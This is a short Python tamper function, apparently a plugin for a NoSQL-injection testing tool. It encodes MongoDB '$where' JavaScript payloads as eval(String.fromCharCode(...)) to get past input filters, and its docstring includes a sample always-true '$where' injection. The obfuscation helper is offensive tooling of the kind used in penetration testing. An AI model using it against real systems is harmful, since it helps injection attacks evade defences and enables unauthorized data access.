import json

def tamper(payload):
    """
    Encodes JavaScript payloads into String.fromCharCode() sequences.
    Example: {"$where": "return true"} -> {"$where": "eval(String.fromCharCode(114,101...))"}
    """
    if not isinstance(payload, dict):
        return payload

    new_payload = payload.copy()
    
    for key, value in new_payload.items():
        if key == "$where" and isinstance(value, str):
            char_codes = [str(ord(c)) for c in value]
            joined_codes = ",".join(char_codes)
            
            encoded_js = f"eval(String.fromCharCode({joined_codes}))"
            new_payload[key] = encoded_js
            
    return json.dumps(new_payload)